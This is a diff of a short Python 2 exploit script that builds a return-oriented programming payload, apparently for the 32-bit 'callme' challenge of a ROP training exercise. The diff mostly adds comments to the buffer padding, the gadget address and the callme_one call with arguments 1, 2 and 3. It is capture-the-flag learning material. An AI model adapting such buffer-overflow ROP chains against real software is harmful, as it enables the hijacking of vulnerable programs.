@@ -2,12 +2,15 @@
 import struct;
 x=lambda a:struct.pack('<I', a);
 
-popx3_ret = 0x80488a9
-payload = 'D'*40 
-payload += 'BBBB'
-payload += x(0x080485c0) # Address of callme_one
-payload += x(popx3_ret) # pop esi; pop edi; pop ebp; ret;
-payload += x(0x1)
+popx3_ret = 0x80488a9 # pop esi; pop edi; pop ebp; ret;
+
+payload = 'D'*40 # Fill buffer
+payload += 'BBBB' # EBP, junk
+
+payload += x(0x080485c0) # Address of callme_one (PLT) # info func callme
+payload += x(popx3_ret) # return address 
+# params
+payload += x(0x1) 
 payload += x(0x2)
 payload += x(0x3)
 
@@ -25,3 +28,4 @@ payload += x(0x3)
 
 
 print payload
+
